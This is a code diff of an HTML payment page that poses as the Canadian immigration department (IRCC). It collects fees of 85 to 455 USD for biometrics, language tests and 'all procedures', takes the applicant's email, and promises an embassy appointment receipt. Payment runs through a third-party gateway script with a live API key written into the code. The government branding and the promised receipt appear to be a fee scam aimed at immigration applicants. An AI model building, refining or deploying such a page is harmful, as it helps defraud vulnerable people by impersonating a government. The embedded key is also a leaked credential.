@@ -8,35 +8,28 @@
 <style>
 body{
   font-family:Arial;
-  background:
-    linear-gradient(rgba(0,0,0,0.6),rgba(0,0,0,0.6)),
-    url("background.jpg") no-repeat center;
+  background: linear-gradient(rgba(0,0,0,0.6),rgba(0,0,0,0.6)), url("background.jpg") no-repeat center;
   background-size:cover;
-
   display:flex;
   flex-direction:column;
   justify-content:center;
   align-items:center;
-
   min-height:100vh;
   margin:0;
 }
-
 .box{
   background:white;
   padding:30px;
   border-radius:12px;
-  width:350px;
+  width:320px;
   text-align:center;
   box-shadow:0 0 15px rgba(0,0,0,0.2);
   margin-bottom:20px;
 }
-
 .logo{
   width:120px;
   margin-bottom:10px;
 }
-
 select,button,input{
   width:100%;
   padding:12px;
@@ -45,7 +38,6 @@ select,button,input{
   border:1px solid #ccc;
   box-sizing: border-box;
 }
-
 button{
   background:#00bcd4;
   color:white;
@@ -53,101 +45,66 @@ button{
   font-weight:bold;
   cursor:pointer;
 }
-
 button:hover{
   background:#0097a7;
 }
-
 #amount{
   margin-top:10px;
   font-weight:bold;
   color:#333;
 }
-
 .footer{
   text-align:center;
   color:white;
   font-size:12px;
 }
-
-.footer img{
-  width:30px;
-  margin-top:5px;
-}
-
-.note-ambassade {
-  background: #f4f7f6;
-  border-left: 4px solid #00bcd4;
-  padding: 10px;
-  font-size: 12px;
-  color: #444;
-  text-align: left;
-  line-height: 1.4;
-  margin-top: 15px;
-  border-radius: 4px;
-}
 </style>
 
 <script src="https://leekpay.fr"></script>
-
 </head>
 
 <body>
 
 <div class="box">
+  <img src="logo.png" class="logo">
+  <h3>Paiement immigration Canada Service</h3>
 
-<img src="logo.png" class="logo">
+  <select id="service" onchange="updateAmount()">
+    <option value="85">1 - Demande biométrique - 85 USD</option>
+    <option value="150">2 - Test de langue - 150 USD</option>
+    <option value="220">3 - Droit administratif - 220 USD</option>
+    <option value="455">4 - Toutes les procédures - 455 USD</option>
+  </select>
 
-<h3>Paiement immigration Canada Service</h3>
+  <!-- CASE EMAIL SIMPLE -->
+  <input type="email" id="email" placeholder="Adresse e-mail du candidat" required>
 
-<select id="service" onchange="updateAmount()">
-  <option value="85">1 - Demande biométrique - 85 USD</option>
-  <option value="150">2 - Test de langue - 150 USD</option>
-  <option value="220">3 - Droit administratif - 220 USD</option>
-  <option value="455">4 - Toutes les procédures - 455 USD</option>
-</select>
+  <!-- TEXTE SIMPLE SANS AUCUN COMPOSANT BLOQUANT -->
+  <p style="font-size:12px; color:#555; text-align:left; margin-top:15px; line-height:1.4;">
+    <strong>📍 Note importante :</strong> Votre date de rendez-vous définitive et votre récépissé officiel vous seront envoyés à cette adresse e-mail. Vous devrez obligatoirement vous présenter à l'ambassade muni de ce récépissé imprimé.
+  </p>
 
-<!-- AJOUT DE LA CASE EMAIL -->
-<input type="email" id="email" placeholder="Adresse e-mail du candidat" required>
+  <p id="amount"></p>
 
-<!-- AJOUT DE VOTRE MESSAGE NOTIFICATION -->
-<div class="note-ambassade">
-  <strong>📍 Note importante :</strong> Votre date de rendez-vous définitive vous sera communiquée par cette adresse e-mail. Un récépissé officiel de prise de rendez-vous vous y sera envoyé. Le candidat devra impérativement se rendre à l'ambassade muni de ce récépissé imprimé.
+  <button onclick="payer()">Payer</button>
 </div>
 
-<p id="amount"></p>
-
-<button onclick="payer()">Payer</button>
-
-<p style="font-size:12px; margin-top:10px;">
-Après avoir cliqué sur "Payer", vous serez redirigé vers une page sécurisée pour confirmer votre paiement.
-</p>
-
-<p style="font-size:11px; margin-top:10px;">
-Ce service de paiement est offert par le gouvernement canadien.
-</p>
-
-</div>
-
-<!-- SIGNATURE AVEC VOTRE COMPORTEMENT D'ORIGINE -->
 <div class="footer">
   <p>© 2026 Immigration, Réfugiés et Citoyenneté Canada</p>
   <p>Plateforme du gouvernement canadien • Paiement sécurisé 🔒</p>
-  <span style="font-size: 24px; display: block; margin-top: 5px;">🇨🇦</span>
+  <span style="font-size: 24px;">🇨🇦</span>
 </div>
 
 <script>
-
 function updateAmount(){
   let usd = service.value;
   amount.innerText = "Montant à payer : " + usd + " USD";
 }
 
 function payer(){
-  // Sécurité pour forcer le candidat à écrire son mail avant de lancer LeekPay
   const emailInput = document.getElementById('email').value.trim();
   if(!emailInput || !emailInput.includes('@')) {
-    alert("Veuillez entrer une adresse e-mail valide pour recevoir votre récépissé.");
+    alert("Veuillez entrer une adresse e-mail valide.");
     return;
   }
 
@@ -158,11 +115,9 @@ function payer(){
     currency: "USD",
     apiKey: "pk_live_OIf3UkphEVWIVAJdd7VB6KWEm7IBuDwK"
   });
-
 }
 
 updateAmount();
-
 </script>
 
 </body>
